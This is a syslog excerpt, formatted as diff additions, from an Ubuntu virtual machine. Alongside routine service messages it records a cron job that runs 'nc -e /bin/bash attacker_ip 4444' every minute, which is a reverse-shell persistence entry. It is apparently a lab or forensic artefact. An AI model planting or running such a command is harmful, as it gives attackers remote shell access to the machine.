+Apr 13 14:57:11 vmuser-Standard-PC-i440FX-PIIX-1996 tracker-miner-fs-3[2562]: (tracker-extract-3:2562): GLib-GIO-WARNING **: 14:57:11.731: Error creating IO channel for /proc/self/mountinfo: Invalid argument (g-io-error-quark, 13)
+Apr 13 14:57:25 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: systemd-localed.service: Deactivated successfully.
+Apr 13 14:57:25 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: systemd-hostnamed.service: Deactivated successfully.
+Apr 13 14:57:41 vmuser-Standard-PC-i440FX-PIIX-1996 geoclue[1538]: Service not used for 60 seconds. Shutting down..
+Apr 13 14:57:41 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: geoclue.service: Deactivated successfully.
+Apr 13 14:57:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-ubuntu\x2dadvantage\x2dnotification-2584.scope - Application launched by gnome-session-binary.
+Apr 13 14:57:53 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-update\x2dnotifier-2579.scope - Application launched by gnome-session-binary.
+Apr 13 14:57:56 vmuser-Standard-PC-i440FX-PIIX-1996 pkexec[2619]: pam_unix(polkit-1:session): session opened for user root(uid=0) by vmuser(uid=1000)
+Apr 13 14:57:56 vmuser-Standard-PC-i440FX-PIIX-1996 pkexec[2619]: vmuser: Executing command [USER=root] [TTY=unknown] [CWD=/home/vmuser] [COMMAND=/usr/lib/update-notifier/package-system-locked]
+Apr 13 14:57:57 vmuser-Standard-PC-i440FX-PIIX-1996 update-notifier.desktop[2627]: [90B blob data]
+Apr 13 14:57:57 vmuser-Standard-PC-i440FX-PIIX-1996 update-notifier.desktop[2627]: [163B blob data]
+Apr 13 14:57:57 vmuser-Standard-PC-i440FX-PIIX-1996 update-notifier.desktop[2627]: [101B blob data]
+Apr 13 14:58:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2639]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 14:58:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2640]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 14:58:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[2642]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 14:58:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[2642]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 14:58:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2639]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 14:58:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2639]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 14:58:02 vmuser-Standard-PC-i440FX-PIIX-1996 update-notifier.desktop[2638]: WARNING:root:can not import unity GI Namespace Dbusmenu not available
+Apr 13 14:59:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2769]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 14:59:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2770]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 14:59:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[2772]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 14:59:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[2772]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 14:59:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2769]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 14:59:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2769]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 14:59:58 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.gnome.Nautilus' requested by ':1.34' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:59:59 vmuser-Standard-PC-i440FX-PIIX-1996 nautilus[2786]: Connecting to org.freedesktop.Tracker3.Miner.Files
+Apr 13 14:59:59 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.Nautilus'
+Apr 13 14:59:59 vmuser-Standard-PC-i440FX-PIIX-1996 org.gnome.Nautilus[2786]: libEGL warning: failed to get driver name for fd -1
+Apr 13 14:59:59 vmuser-Standard-PC-i440FX-PIIX-1996 org.gnome.Nautilus[2786]: libEGL warning: MESA-LOADER: failed to retrieve device information
+Apr 13 14:59:59 vmuser-Standard-PC-i440FX-PIIX-1996 org.gnome.Nautilus[2786]: libEGL warning: failed to get driver name for fd -1
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 org.gnome.Nautilus[2786]: MESA: error: ZINK: failed to choose pdev
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 org.gnome.Nautilus[2786]: libEGL warning: egl: failed to create dri2 screen
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Activating via systemd: service name='org.freedesktop.hostname1' unit='dbus-org.freedesktop.hostname1.service' requested by ':1.108' (uid=1000 pid=2786 comm="/usr/bin/nautilus --gapplication-service" label="nautilus (unconfined)")
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: meta_window_set_stack_position_no_sync: assertion 'window->stack_position >= 0' failed
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting sysstat-collect.service - system activity accounting tool...
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting systemd-hostnamed.service - Hostname Service...
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: sysstat-collect.service: Deactivated successfully.
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished sysstat-collect.service - system activity accounting tool.
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Successfully activated service 'org.freedesktop.hostname1'
+Apr 13 15:00:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started systemd-hostnamed.service - Hostname Service.
+Apr 13 15:00:01 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Invalid sequence for VSYNC frame info
+Apr 13 15:00:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2830]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:00:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2831]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:00:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[2833]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:00:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[2833]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:00:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2830]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:00:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2830]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:00:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started snap.firmware-updater.firmware-notifier.service - Service for snap application firmware-updater.firmware-notifier.
+Apr 13 15:00:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: tmp-snap.rootfs_iwoAQk.mount: Deactivated successfully.
+Apr 13 15:00:29 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110429.378:167): apparmor="DENIED" operation="open" class="file" profile="snap.firmware-updater.firmware-notifier" name="/proc/sys/vm/max_map_count" pid=2836 comm="firmware-notifi" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:00:29 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Activating via systemd: service name='org.freedesktop.fwupd' unit='fwupd.service' requested by ':1.110' (uid=1000 pid=2836 comm="/snap/firmware-updater/224/bin/firmware-notifier" label="snap.firmware-updater.firmware-notifier (enforce)")
+Apr 13 15:00:29 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting fwupd.service - Firmware update daemon...
+Apr 13 15:00:29 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Activating via systemd: service name='org.bluez' unit='dbus-org.bluez.service' requested by ':1.111' (uid=0 pid=2905 comm="/usr/libexec/fwupd/fwupd" label="unconfined")
+Apr 13 15:00:29 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: bluetooth.service - Bluetooth service was skipped because of an unmet condition check (ConditionPathIsDirectory=/sys/class/bluetooth).
+Apr 13 15:00:31 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: systemd-hostnamed.service: Deactivated successfully.
+Apr 13 15:00:31 vmuser-Standard-PC-i440FX-PIIX-1996 fwupd[2905]: 20:00:31.324 FuMain               fwupd 1.9.33 ready for requests (locale en_US.UTF-8)
+Apr 13 15:00:31 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Successfully activated service 'org.freedesktop.fwupd'
+Apr 13 15:00:31 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started fwupd.service - Firmware update daemon.
+Apr 13 15:00:54 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Failed to activate service 'org.bluez': timed out (service_start_timeout=25000ms)
+Apr 13 15:01:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2918]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:01:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2919]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:01:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[2921]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:01:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[2921]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:01:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2918]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:01:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2918]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:01:28 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[694]: Job `cron.daily' started
+Apr 13 15:01:30 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[2969]: Updated timestamp for job `cron.daily' to 2026-04-13
+Apr 13 15:01:30 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting update-notifier-download.service - Download data for packages that failed at package install time...
+Apr 13 15:01:30 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[694]: Job `cron.daily' terminated
+Apr 13 15:01:30 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: update-notifier-download.service: Deactivated successfully.
+Apr 13 15:01:30 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished update-notifier-download.service - Download data for packages that failed at package install time.
+Apr 13 15:01:34 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.21' (uid=0 pid=725 comm="/snap/snapd/current/usr/lib/snapd/snapd" label="unconfined")
+Apr 13 15:01:34 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting systemd-timedated.service - Time & Date Service...
+Apr 13 15:01:34 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Successfully activated service 'org.freedesktop.timedate1'
+Apr 13 15:01:34 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started systemd-timedated.service - Time & Date Service.
+Apr 13 15:01:36 vmuser-Standard-PC-i440FX-PIIX-1996 snapd[725]: storehelpers.go:916: cannot refresh: snap has no updates available: "bare", "core22", "core24", "firefox", "firmware-updater", "ghidra", "gnome-42-2204", "gnome-46-2404", "gtk-common-themes", "mesa-2404", "snap-store", "snapd", "snapd-desktop-integration"
+Apr 13 15:01:54 vmuser-Standard-PC-i440FX-PIIX-1996 PackageKit[1266]: daemon quit
+Apr 13 15:01:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting fwupd-refresh.service - Refresh fwupd metadata and update motd...
+Apr 13 15:01:54 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: packagekit.service: Deactivated successfully.
+Apr 13 15:01:54 vmuser-Standard-PC-i440FX-PIIX-1996 fwupdmgr[2982]: Updating lvfs
+Apr 13 15:01:56 vmuser-Standard-PC-i440FX-PIIX-1996 fwupdmgr[2982]: Successfully downloaded new metadata: 0 local devices supported
+Apr 13 15:01:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: fwupd-refresh.service: Deactivated successfully.
+Apr 13 15:01:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished fwupd-refresh.service - Refresh fwupd metadata and update motd.
+Apr 13 15:02:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[3020]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:02:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[3021]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:02:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[3023]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:02:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[3023]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:02:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[3020]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:02:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[3020]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:02:04 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: systemd-timedated.service: Deactivated successfully.
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started snap.firefox.firefox-a98fdb58-e751-459e-a5cb-e819b73ddd87.scope.
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: launchpadlib-cache-clean.service - Clean up old files in the Launchpadlib cache was skipped because of an unmet condition check (ConditionPathExists=/home/vmuser/.launchpadlib/api.launchpad.net/cache).
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: tmp-snap.rootfs_sEODNw.mount: Deactivated successfully.
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 firefox_firefox.desktop[3054]: update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/local/share/doc /usr/local/share/doc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/local/share/doc" because it would affect the host in "/var/lib/snapd"
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 firefox_firefox.desktop[3054]: update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gimp/2.0/help /usr/share/gimp/2.0/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gimp/2.0/help" because it would affect the host in "/var/lib/snapd"
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 firefox_firefox.desktop[3054]: update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gtk-doc /usr/share/gtk-doc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gtk-doc" because it would affect the host in "/var/lib/snapd"
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 firefox_firefox.desktop[3054]: update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/libreoffice/help /usr/share/libreoffice/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/libreoffice/help" because it would affect the host in "/var/lib/snapd"
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 firefox_firefox.desktop[3054]: update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme /usr/share/sphinx_rtd_theme none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme" because it would affect the host in "/var/lib/snapd"
+Apr 13 15:02:11 vmuser-Standard-PC-i440FX-PIIX-1996 firefox_firefox.desktop[3054]: update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/xubuntu-docs /usr/share/xubuntu-docs none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/xubuntu-docs" because it would affect the host in "/var/lib/snapd"
+Apr 13 15:02:13 vmuser-Standard-PC-i440FX-PIIX-1996 firefox[3027]: Not loading module "atk-bridge": The functionality is provided by GTK natively. Please try to not load it.
+Apr 13 15:02:15 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.115' (uid=1000 pid=3027 comm="/snap/firefox/8054/usr/lib/firefox/firefox" label="snap.firefox.firefox (enforce)")
+Apr 13 15:02:15 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting systemd-timedated.service - Time & Date Service...
+Apr 13 15:02:15 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Successfully activated service 'org.freedesktop.timedate1'
+Apr 13 15:02:15 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started systemd-timedated.service - Time & Date Service.
+Apr 13 15:02:18 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 15:02:18 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 15:02:18 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 15:02:18 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 15:02:18 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 3239 of process 3027 owned by '1000' RT at priority 10.
+Apr 13 15:02:18 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:19 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:19 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:19 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: meta_window_set_stack_position_no_sync: assertion 'window->stack_position >= 0' failed
+Apr 13 15:02:19 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='io.snapcraft.Settings' requested by ':1.122' (uid=1000 pid=3288 comm="dbus-send --print-reply=literal --session --dest=i" label="snap.firefox.firefox (enforce)")
+Apr 13 15:02:20 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'io.snapcraft.Settings'
+Apr 13 15:02:20 vmuser-Standard-PC-i440FX-PIIX-1996 io.snapcraft.Settings[3291]: userd.go:93: Starting snap userd
+Apr 13 15:02:21 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110541.275:168): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="firefox" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:02:21 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:21 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:22 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:22 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:22 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:22 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:26 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:26 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 1 users.
+Apr 13 15:02:30 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110550.865:169): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:02:35 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110555.914:170): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:02:45 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: systemd-timedated.service: Deactivated successfully.
+Apr 13 15:02:53 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110573.091:171): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:02:58 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110578.104:172): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:03:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4168]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:03:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4169]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:03:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4171]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:03:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4171]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:03:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4168]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:03:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4168]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:03:03 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110583.238:173): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:03:24 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110604.071:174): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:03:29 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110609.429:175): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:03:40 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110620.631:176): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:03:54 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110634.368:177): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:04:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4181]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:04:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4182]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:04:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4184]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:04:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4184]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:04:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4181]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:04:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4181]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:04:07 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110647.400:178): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:04:12 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110652.408:179): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:04:17 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110657.434:180): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:04:22 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110662.908:181): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:04:27 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110667.916:182): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:04:32 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110672.994:183): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:04:37 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110677.995:184): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110701.048:185): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4197]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4198]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4199]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4200]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4197]: pam_unix(cron:session): session closed for user root
